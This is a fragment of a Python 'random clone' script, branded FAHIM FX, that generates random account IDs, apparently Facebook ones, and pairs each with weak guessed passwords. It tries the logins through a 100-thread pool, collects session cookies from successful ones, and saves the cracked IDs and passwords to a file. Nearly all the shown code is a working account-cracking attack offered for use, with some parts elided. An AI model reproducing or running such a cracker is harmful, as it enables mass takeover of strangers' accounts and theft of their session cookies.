...
logo=(f"""
            ...
            \033[38;5;46m██╔══╝   ██╔██╗ 
            \033[38;5;46m██║     ██╔╝ ██╗
            \033[38;5;46m╚═╝     ╚═╝  ╚═╝ \x1b[1;41m\x1b[1;97mTEAM [FX] \x1b[1;0m
...
\033[1;32m==================================================
          Author     : FAHIM FX🗝️
          Telegram   : FX COMMUNITY          
          Facebook   : FX FAHIM
          Github     : FX-FAHIM
          Version    : \033[1;96mRANDOM CLONE \033[1;31m[FREE•3]\x1b[0m
\033[1;31m==================================================           
\x1b[0;97m\x1b[1;43m         🍂  FAHIM FX🗝️ IS A BRAND 🥰          \x1b[0m
""")
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
...
def main():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=100) as FAHIM:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;32m='*50)
        ...
        print(f"\033[1;31m[\033[1;96m•\033[1;31m] \033[1;31mFILE SAVE IN /sdcard/FAHIM-OK🥰.txt")
        print('\033[1;32m='*50)
        for guru in user:
            uid = nude+nudex+nud+guru
            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla']
            FAHIM.submit(rcrack,uid,pwx,tl)
    print ('\033[1;31m==================================================           ')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sFAHIM-FX🗝️\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;32m[FAHIM-CP😔] \033[1;31m{uid} • {ps}")
                os.system("espeak \"FAHIM, CP, ID \"")
